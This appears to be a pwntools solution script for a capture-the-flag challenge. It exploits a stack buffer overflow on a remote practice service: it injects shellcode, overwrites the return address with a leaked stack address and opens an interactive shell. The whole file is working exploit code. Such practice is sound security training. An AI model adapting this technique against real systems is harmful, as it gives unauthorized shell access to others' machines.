from pwn import *

r=remote("pwn2.jarvisoj.com",9877)

#r=process("./level1")

#gdb.attach(r)

address=r.recvuntil("?",drop=True)
#address=r.recvuntil(":")

address=int(address[12:],16)
#address=int(address[12:-2],16)

shellcode=asm(shellcraft.sh())

#payload=shellcode+(0x88+0x4)*"a"+p32(address)
payload=shellcode.ljust(0x88,"a")+"a"*4+p32(address)

r.sendline(payload)

r.interactive()
